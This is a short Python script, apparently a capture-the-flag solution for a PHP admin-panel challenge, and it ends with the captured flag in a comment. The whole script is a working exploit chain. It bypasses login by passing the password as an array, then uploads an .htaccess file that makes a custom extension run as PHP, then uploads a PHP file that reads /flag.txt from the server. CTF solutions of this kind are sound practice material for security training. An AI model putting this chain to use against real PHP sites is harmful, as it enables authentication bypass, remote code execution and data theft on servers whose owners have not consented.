import requests

url = "https://admin-panel-131051901a26.instancer.sekai.team"

file_htaccess = """
<FilesMatch "\.ppp$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""

file_exp = """
<?= file_get_contents('/flag.txt') ?>
"""

with requests.session() as s:
    s.post(url + "/login.php", data={
        "username": "peppy",
        "password[]": "1"
    })

    s.post(url + "/admin.php", files={
        "file": (".htaccess", file_htaccess)
    })

    resp = s.post(url + "/admin.php", files={
        "file": ("exp.ppp", file_exp)
    })
    print(resp.text)

# osu{php_is_too_3asy}
